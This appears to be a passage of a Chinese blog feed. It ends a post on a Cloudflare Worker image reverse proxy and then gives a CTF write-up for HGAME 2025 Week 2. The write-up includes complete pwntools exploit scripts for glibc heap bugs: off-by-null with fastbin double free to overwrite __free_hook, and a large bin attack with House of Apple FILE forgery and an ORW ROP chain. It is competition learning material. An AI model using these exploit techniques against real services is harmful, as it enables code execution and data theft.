  } <span class="keyword">else</span> <span class="keyword">if</span> (j == <span class="string">"$custom_domain"</span>) {</span><br><span class="line">      j = host_name;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> re = <span class="keyword">new</span> <span class="title class_">RegExp</span>(i, <span class="string">"g"</span>);</span><br><span class="line">    text = text.<span class="title function_">replace</span>(re, j);</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">return</span> text;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">device_status</span>(<span class="params">user_agent_info</span>) {</span><br><span class="line">  <span class="keyword">var</span> agents = [</span><br><span class="line">    <span class="string">"Android"</span>,</span><br><span class="line">    <span class="string">"iPhone"</span>,</span><br><span class="line">    <span class="string">"SymbianOS"</span>,</span><br><span class="line">    <span class="string">"Windows Phone"</span>,</span><br><span class="line">    <span class="string">"iPad"</span>,</span><br><span class="line">    <span class="string">"iPod"</span>,</span><br><span class="line">  ];</span><br><span class="line">  <span class="keyword">var</span> flag = <span class="literal">true</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> v = <span class="number">0</span>; v &lt; agents.<span class="property">length</span>; v++) {</span><br><span class="line">    <span class="keyword">if</span> (user_agent_info.<span class="title function_">indexOf</span>(agents[v]) &gt; <span class="number">0</span>) {</span><br><span class="line">      flag = <span class="literal">false</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">return</span> flag;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>事实上实现基本的反代功能，只需要如下代码：</p><figure class="highlight javascript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> {</span><br><span class="line">  <span class="keyword">async</span> <span class="title function_">fetch</span>(<span class="params">request</span>) {</span><br><span class="line">    <span class="keyword">const</span> url = <span class="keyword">new</span> <span class="title function_">URL</span>(request.<span class="property">url</span>);</span><br><span class="line">    url.<span class="property">hostname</span> = <span class="string">'i.pximg.net'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> proxyRequest = <span class="keyword">new</span> <span class="title class_">Request</span>(url, request);</span><br><span class="line">    proxyRequest.<span class="property">headers</span>.<span class="title function_">set</span>(<span class="string">'Referer'</span>, <span class="string">'https://www.pixiv.net/'</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">fetch</span>(proxyRequest);</span><br><span class="line">  },</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><p>部署在 pixiv.summ2.link 上，它可以成功配置在 PixEz（一个 Pixiv第三方客户端）中。</p><p>Example:</p><p><a href="https://pixiv.summ2.link/img-original/img/2023/11/20/18/53/42/113565191_p0.jpg">https://pixiv.summ2.link/img-original/img/2023/11/20/18/53/42/113565191_p0.jpg</a></p><h1 id="参考">参考</h1><section id="footnotes" class="footnotes footnotes-end-of-document" role="doc-endnotes"><hr><ol><li id="fn1"><p>https://en.wikipedia.org/wiki/Proxy_server<a href="#fnref1" class="footnote-back" role="doc-backlink">↩︎</a></p></li><li id="fn2"><p>https://en.wikipedia.org/wiki/Reverse_proxy<a href="#fnref2" class="footnote-back" role="doc-backlink">↩︎</a></p></li></ol></section>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;前言&lt;/h1&gt;
&lt;p&gt;由于友链页面有使用图片的要求，同时为其他人的站点提供相关的图片资源（虽然使用现成的 GitHub
Page 就可以基本实现，但是 Page 所在的仓库是公开的），尝试通过 GitHub 作为图床解决这个问题。然而，访问速度和稳定性都无法得到保证，为此通过网上搜索学习了一下反向代理
(Reverse Proxy) 的相关知识。&lt;/p&gt;</summary>
    
    
    
    <category term="Web" scheme="http://summ2.link/categories/Web/"/>
    
    
    <category term="Reverse Proxy" scheme="http://summ2.link/tags/Reverse-Proxy/"/>
    
  </entry>
  
  <entry>
    <title>HGAME 2025 Week 2 Writeup</title>
    <link href="http://summ2.link/categories/CTF/hgame-2025-week2-wp/"/>
    <id>http://summ2.link/categories/CTF/hgame-2025-week2-wp/</id>
    <published>2025-02-17T16:00:00.000Z</published>
    <updated>2025-05-08T04:15:12.664Z</updated>
    
    <content type="html"><![CDATA[<h1 id="signin2heap">Signin2Heap</h1><h2 id="vulnerabilities">Vulnerabilities</h2><p><img src="\2025218-HGAME-2025-Week-2-Writeup\image-20250218122102849.png"></p><p>存在 off-by-null 漏洞，当 <code>prev_size</code> 域复用时，可置零相邻chunk 的 <code>prev_inuse</code> 位。</p><span id="more"></span><p><img src="\2025218-HGAME-2025-Week-2-Writeup\image-20250218122545228.png"></p><p>只能申请至多 <code>0xFF</code> 大小的堆块，考虑 fastbin attack。</p><h2 id="exploit">Exploit</h2><p>由于程序没有编辑功能，只能使用 add 功能修改堆数据。布置大小分别为<code>0xf0</code>, <code>0x68</code>, <code>0xf0</code>的三个堆块，然后将 <code>0xf0</code> 大小的 <code>tcache bin</code>填满。此时释放 chunk 0，将进入 <code>unsorted bin</code>。为了泄露出 libc 有关地址，我们需要利用 show 功能输出 freed chunk上的指针 (即 <code>fd</code> )。通过如下操作可以实现类似 UAF 的效果：</p><ul><li>修改 chunk 2 的 <code>prev_size</code> 和 <code>prev_inuse</code>；</li><li>释放 chunk 2，引起向后合并，此时堆管理器认为 chunk 0 ~ chunk 2都已经为空闲状态，放入 <code>unsorted bin</code> ；</li><li>先清空优先级更高的 <code>tcache bin</code> ，然后申请 chunk 0大小的堆，从 <code>unsorted bin</code> 中取，此时 fd 移动到 chunk 0的后面。</li></ul><p>经过以上操作后，chunk 1 的位置恰好是 <code>unsorted bin</code>的头部。但同时程序逻辑上 chunk 1 并没有被释放，引起了 UAF，doublefree。</p><p>再次填满 <code>tcache bin</code> ，利用 fastbin double free可实现任意写。</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level =<span class="string">"debug"</span></span><br><span class="line">p = remote(<span class="string">"node1.hgame.vidar.club"</span>,<span class="number">32253</span>)</span><br><span class="line">e = ELF(<span class="string">"./vuln"</span>)</span><br><span class="line">libc = ELF(<span class="string">"./libc-2.27.so"</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index,size,content</span>):</span><br><span class="line">    p.sendafter(<span class="string">"Your choice:"</span>,<span class="string">b"\x01\x00"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Index:"</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">"Size: "</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendafter(<span class="string">"Content: "</span>,content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendafter(<span class="string">"Your choice:"</span>,<span class="string">b"\x03\x00"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Index:"</span>,<span class="built_in">str</span>(index))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dele</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendafter(<span class="string">"Your choice:"</span>,<span class="string">b"\x02\x00"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Index:"</span>,<span class="built_in">str</span>(index))</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0xf0</span>,<span class="string">'a'</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x68</span>,<span class="string">'a'</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0xf0</span>,<span class="string">'b'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>,<span class="number">10</span>):</span><br><span class="line">  add(i,<span class="number">0xf0</span>,<span class="string">'a'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>,<span class="number">10</span>): <span class="comment">#fill tcache</span></span><br><span class="line">   dele(i)</span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x68</span>,<span class="string">b'a'</span>*<span class="number">0x60</span>+p64(<span class="number">0x170</span>))</span><br><span class="line">dele(<span class="number">2</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>,<span class="number">10</span>):</span><br><span class="line">  add(i,<span class="number">0xf0</span>,<span class="string">'a'</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0xf0</span>,<span class="string">'a'</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">main_arena = u64(p.recvuntil(<span class="string">'\x0a\x31'</span>,drop=<span class="literal">True</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b'\x00'</span>))</span><br><span class="line">libc_base = main_arena - <span class="number">0x3ebca0</span></span><br><span class="line">log.info(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">free_hook = libc_base + libc.symbols[<span class="string">'__free_hook'</span>]</span><br><span class="line">one_gadget = libc_base + <span class="number">0x4f302</span></span><br><span class="line">add(<span class="number">11</span>,<span class="number">0x30</span>,<span class="string">'a'</span>)</span><br><span class="line">add(<span class="number">12</span>,<span class="number">0x30</span>,<span class="string">'a'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>,<span class="number">10</span>):</span><br><span class="line">    dele(i)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>,<span class="number">10</span>):</span><br><span class="line">    add(i,<span class="number">0x30</span>,<span class="string">'a'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>,<span class="number">10</span>): <span class="comment">#fill tcache</span></span><br><span class="line">    dele(i)</span><br><span class="line">dele(<span class="number">11</span>)</span><br><span class="line">dele(<span class="number">12</span>) <span class="comment">#a padding chunk</span></span><br><span class="line">dele(<span class="number">1</span>) <span class="comment">#fastbin double free</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>,<span class="number">10</span>):</span><br><span class="line">    add(i,<span class="number">0x30</span>,<span class="string">'a'</span>) <span class="comment">#clear tcache</span></span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x30</span>,p64(free_hook))</span><br><span class="line">add(<span class="number">12</span>,<span class="number">0x30</span>,<span class="string">'qaq'</span>)</span><br><span class="line">add(<span class="number">11</span>,<span class="number">0x30</span>,<span class="string">'qaq'</span>) <span class="comment">#clear padding chunk</span></span><br><span class="line">add(<span class="number">13</span>,<span class="number">0x30</span>,p64(one_gadget)) <span class="comment">#a chunk at &lt;__free_hook&gt;</span></span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></tbody></table></figure><h1 id="where-is-the-vulnerability">Where is the vulnerability</h1><p><img src="\2025218-HGAME-2025-Week-2-Writeup\image-20250218125457752.png"></p><p>第一次打这么高版本的libc（原谅我当时脑抽看成 2.29，一堆老漏洞用了半天发现不行 hhh）</p><p><img src="\2025218-HGAME-2025-Week-2-Writeup\image-20250218133051872.png"></p><p>禁用 <code>execve</code></p><h2 id="vulnerabilities-1">Vulnerabilities</h2><p><img src="\2025218-HGAME-2025-Week-2-Writeup\image-20250218125645031.png"></p><p>明显的 UAF 漏洞。</p><p><img src="\2025218-HGAME-2025-Week-2-Writeup\image-20250218125720609.png"></p><p>只能申请 <code>0x500 ~ 0x900</code> 大小的堆，考虑 large binattack。</p><h2 id="exploit-1">Exploit</h2><p>堆块大小限制导致我们只能使用 <code>unsorted bin</code> 和<code>large bin</code>，即使通过 UAF 漏洞可以修改堆上的<code>size</code> 从而使其进入 <code>tcache bin</code>，但是不能重新申请进行利用。</p><p>显而易见的，可以利用 <code>unsorted bin</code> 的特性快速得到 libc基址。</p><p>同时，布置后续的堆块，以进行 large bin attack。</p><p>large bin attack 的操作简要描述如下，当然在 how2heap中有更好更详细的描述：</p><ul><li>申请两个chunk，且大小不相同，并在其之后都申请任意大小的堆块，防止释放后合并；</li><li>释放 chunk 0；</li><li>申请一个大于 chunk 0 大小的堆，chunk 0 将进入<code>large bin</code>；</li><li>释放 chunk 2；</li><li>修改 chunk 0 的 <code>bk_nextsize</code> 为<code>target - 0x20{sizeof(prev_size + fd + bk + fd_nextsize)}</code>。</li><li>重复第三步，chunk 2 将进入 <code>large bin</code> ，由于 chunk 2更小，导致操作<code>bk_nextsize-&gt;fd_nextsize = &amp;chunk2</code>。</li></ul><p>此时就在目标位置写入了 chunk 2 的 <code>prev_size</code> 地址。</p><p>通过一种叫做 House of apple的方式，就可以攻击 IO，劫持程序执行流。</p><p>在泄露出 libc 地址后，进而得到 <code>IO_list_all</code> 的地址，利用large bin attack 将 chunk 地址写入，之后在 chunk 2 上伪造 FILE结构体。</p><p>原理部分请自行查找（毕竟我还没完全弄明白）。我们主要关注伪造 IO 的最后一行，它可以让我们跳转到一个地址，即控制一次<code>$RIP</code> 。我们的目的是找到一个gadget，帮助我们实现栈迁移，执行 ROP 链。</p><p>可以利用的 gadget 如下：</p><figure><img src="\2025218-HGAME-2025-Week-2-Writeup\2b951edb6231c43309081359d1541a02.png" alt="gadget 1"><figcaption aria-hidden="true">gadget 1</figcaption></figure><p>动态调试可以发现 <code>$rax</code> 指向 fake_io有关地址，因此可以改变 <code>$rdx</code> 的值。</p><p>将 <code>$rdx</code> 改为一处可读写段，执行下一段 gadget：</p><figure><img src="\2025218-HGAME-2025-Week-2-Writeup\image-20250218134613219.png" alt="gadget 2.1"><figcaption aria-hidden="true">gadget 2.1</figcaption></figure><figure><img src="\2025218-HGAME-2025-Week-2-Writeup\image-20250218134705426.png" alt="gadget 2.2"><figcaption aria-hidden="true">gadget 2.2</figcaption></figure><p>修改 <code>$rsp</code> 实现栈迁移，注意在后面会将<code>$rcx=[rdx+0xa8]</code>入栈，改为一个对后续无影响的可执行地址即可，或者 ROP 的第一个地址。</p><p>最后进入 <code>exit()</code> 触发相关调用链，执行orw（如此有仪式感的操作自然是手动完成）。</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level =<span class="string">"debug"</span></span><br><span class="line">p = remote(<span class="string">"node1.hgame.vidar.club"</span>,<span class="number">31067</span>)</span><br><span class="line">e = ELF(<span class="string">"./vuln"</span>)</span><br><span class="line">libc = ELF(<span class="string">"./libc.so.6"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index,size</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">"5. Exit"</span>,<span class="string">b"1"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Index:"</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">"Size: "</span>,<span class="built_in">str</span>(size))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">"5. Exit"</span>,<span class="string">b"4"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Index:"</span>,<span class="built_in">str</span>(index))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dele</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">"5. Exit"</span>,<span class="string">b"2"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Index:"</span>,<span class="built_in">str</span>(index))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">"5. Exit"</span>,<span class="string">b"3"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Index:"</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendafter(<span class="string">"Content: "</span>,content)</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x528</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x508</span>) <span class="comment">#prevent consolidating</span></span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x518</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x721</span>)</span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">main_arena = u64(p.recvuntil(<span class="string">'\x0a\x31'</span>,drop=<span class="literal">True</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b'\x00'</span>))</span><br><span class="line">libc_base = main_arena - <span class="number">0x203b20</span></span><br><span class="line">IO_list_all=libc_base+libc.symbols[<span class="string">'_IO_list_all'</span>]</span><br><span class="line">_IO_stdfile_2_lock=libc_base+<span class="number">0x205700</span></span><br><span class="line"></span><br><span class="line">_<span class="built_in">open</span>=libc_base+libc.sym[<span class="string">'open'</span>]</span><br><span class="line">_read=libc_base+libc.sym[<span class="string">'read'</span>]</span><br><span class="line">_write=libc_base+libc.sym[<span class="string">'write'</span>]</span><br><span class="line"></span><br><span class="line">pop_rdi = libc_base + <span class="number">0x10f75b</span></span><br><span class="line">pop_rsi = libc_base + <span class="number">0x110a4d</span></span><br><span class="line">pop_rdx = libc_base + <span class="number">0x66b9a</span> <span class="comment">#pop rdx ; ret 0x19</span></span><br><span class="line"></span><br><span class="line">gadget = libc_base + <span class="number">0x176f0e</span></span><br><span class="line">setcontext = libc_base + <span class="number">0x4a98d</span></span><br><span class="line">ret = libc_base + <span class="number">0x2882f</span></span><br><span class="line">log.info(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x558</span>)</span><br><span class="line">dele(<span class="number">2</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">chunk_fd = u64(p.recvuntil(<span class="string">'\x0a\x31'</span>,drop=<span class="literal">True</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b'\x00'</span>))</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">b'a'</span>*<span class="number">16</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">fd_nextsize = u64(p.recvuntil(<span class="string">'\x0a\x31'</span>,drop=<span class="literal">True</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b'\x00'</span>))</span><br><span class="line">heap_base = fd_nextsize + <span class="number">0x10</span></span><br><span class="line">log.info(<span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,p64(chunk_fd)*<span class="number">2</span>+p64(fd_nextsize)+p64(IO_list_all-<span class="number">0x20</span>))</span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x558</span>) <span class="comment">#large bin attack: write chunk address at target</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">orw_addr = heap_base + <span class="number">0x1bf0</span></span><br><span class="line">file_addr = heap_base + <span class="number">0xa30</span></span><br><span class="line">IO_wide_data_addr=file_addr</span><br><span class="line">wide_vtable_addr=file_addr+<span class="number">0xe8</span>-<span class="number">0x68</span></span><br><span class="line"></span><br><span class="line">fake_io = <span class="string">b""</span></span><br><span class="line">fake_io += p64(<span class="number">0</span>)  <span class="comment"># _IO_read_end</span></span><br><span class="line">fake_io += p64(<span class="number">0</span>)  <span class="comment"># _IO_read_base</span></span><br><span class="line">fake_io += p64(<span class="number">0</span>)  <span class="comment"># _IO_write_base</span></span><br><span class="line">fake_io += p64(<span class="number">1</span>)  <span class="comment"># _IO_write_ptr</span></span><br><span class="line">fake_io += p64(<span class="number">0</span>)  <span class="comment"># _IO_write_end</span></span><br><span class="line">fake_io += p64(<span class="number">0</span>)  <span class="comment"># _IO_buf_base;</span></span><br><span class="line">fake_io += p64(<span class="number">0</span>)  <span class="comment"># _IO_buf_end should usually be (_IO_buf_base + 1)</span></span><br><span class="line">fake_io += p64(<span class="number">0</span>)  <span class="comment"># _IO_save_base</span></span><br><span class="line">fake_io += p64(<span class="number">0</span>)*<span class="number">3</span>  <span class="comment"># from _IO_backup_base to _markers</span></span><br><span class="line">fake_io += p64(<span class="number">0</span>)  <span class="comment"># the FILE chain ptr</span></span><br><span class="line">fake_io += p32(<span class="number">2</span>)  <span class="comment"># _fileno for stderr is 2</span></span><br><span class="line">fake_io += p32(<span class="number">0</span>)  <span class="comment"># _flags2, usually 0</span></span><br><span class="line">fake_io += p64(<span class="number">0xFFFFFFFFFFFFFFFF</span>)  <span class="comment"># _old_offset, -1</span></span><br><span class="line">fake_io += p16(<span class="number">0</span>)  <span class="comment"># _cur_column</span></span><br><span class="line">fake_io += <span class="string">b"\x00"</span>  <span class="comment"># _vtable_offset</span></span><br><span class="line">fake_io += <span class="string">b"\n"</span>  <span class="comment"># _shortbuf[1]</span></span><br><span class="line">fake_io += p32(<span class="number">0</span>)  <span class="comment"># padding</span></span><br><span class="line">fake_io += p64(_IO_stdfile_2_lock)  <span class="comment"># _IO_stdfile_1_lock</span></span><br><span class="line">fake_io += p64(<span class="number">0xFFFFFFFFFFFFFFFF</span>)  <span class="comment"># _offset, -1</span></span><br><span class="line">fake_io += p64(<span class="number">0</span>)  <span class="comment"># _codecvt, usually 0</span></span><br><span class="line">fake_io += p64(IO_wide_data_addr)  <span class="comment"># _IO_wide_data_1</span></span><br><span class="line">fake_io += p64(<span class="number">0</span>) * <span class="number">2</span>  <span class="comment"># from _freeres_list to __pad5</span></span><br><span class="line">fake_io += p64(orw_addr+<span class="number">0x100</span>) <span class="comment">#rdx value(__pad5)</span></span><br><span class="line">fake_io += p32(<span class="number">0xFFFFFFFF</span>)  <span class="comment"># _mode, usually -1</span></span><br><span class="line">fake_io += <span class="string">b"\x00"</span> * <span class="number">19</span>  <span class="comment"># _unused2</span></span><br><span class="line">fake_io = fake_io.ljust(<span class="number">0xc8</span>, <span class="string">b'\x00'</span>)  <span class="comment"># adjust to vtable</span></span><br><span class="line">fake_io += p64(libc_base+libc.sym[<span class="string">'_IO_wfile_jumps'</span>])  <span class="comment"># fake vtable</span></span><br><span class="line">fake_io += p64(wide_vtable_addr)</span><br><span class="line">fake_io += p64(gadget) <span class="comment">#set rdx</span></span><br><span class="line">edit(<span class="number">2</span>,fake_io)</span><br><span class="line"></span><br><span class="line">orw_payload = flat({</span><br><span class="line">    <span class="number">0x00</span>: [</span><br><span class="line">        p64(pop_rdi),</span><br><span class="line">        p64(orw_addr+<span class="number">0x128</span>),</span><br><span class="line">        p64(pop_rsi),</span><br><span class="line">        p64(<span class="number">0</span>),</span><br><span class="line">        p64(pop_rdx),</span><br><span class="line">        p64(<span class="number">0</span>),</span><br><span class="line">        p64(_<span class="built_in">open</span>), <span class="comment"># open(./flag,0,0)</span></span><br><span class="line">        <span class="string">b'a'</span>*<span class="number">0x19</span>, <span class="comment"># padding</span></span><br><span class="line">        p64(pop_rdi),</span><br><span class="line">        p64(<span class="number">3</span>),</span><br><span class="line">        p64(pop_rsi),</span><br><span class="line">        p64(orw_addr+<span class="number">0x200</span>),</span><br><span class="line">        p64(pop_rdx),</span><br><span class="line">        p64(<span class="number">0x30</span>),</span><br><span class="line">        p64(_read), <span class="comment"># read(3,buf,0x30)</span></span><br><span class="line">        <span class="string">b'a'</span>*<span class="number">0x19</span>,</span><br><span class="line">        p64(pop_rdi),</span><br><span class="line">        p64(<span class="number">1</span>),</span><br><span class="line">        p64(pop_rsi),</span><br><span class="line">        p64(orw_addr+<span class="number">0x200</span>),</span><br><span class="line">        p64(pop_rdx),</span><br><span class="line">        p64(<span class="number">0x30</span>),</span><br><span class="line">        p64(_write), <span class="comment"># write(1,buf,0x30)</span></span><br><span class="line">        <span class="string">b'a'</span>*<span class="number">0x19</span>,</span><br><span class="line">    ],</span><br><span class="line">    <span class="number">0x120</span>: [</span><br><span class="line">        p64(setcontext),</span><br><span class="line">        <span class="string">b'./flag\x00\x00'</span>,</span><br><span class="line">    ],</span><br><span class="line">    <span class="number">0x1a0</span>: [</span><br><span class="line">        p64(orw_addr), <span class="comment">#rsp value</span></span><br><span class="line">        p64(ret),</span><br><span class="line">    ]</span><br><span class="line">})</span><br><span class="line">edit(<span class="number">5</span>,orw_payload)</span><br><span class="line">edit(<span class="number">1</span>,<span class="string">b'a'</span>*<span class="number">0x500</span>+<span class="string">b' sh;'</span>) <span class="comment">#reserved for debug, [$rdi]</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></tbody></table></figure><h1 id="hit-list">Hit list</h1><p>很遗憾本题没有解出，因为前面较少接触的堆题耗费了我挺多心力的，到这已经没什么精力去做了。不过收获很多，是大于遗憾的。</p><h1 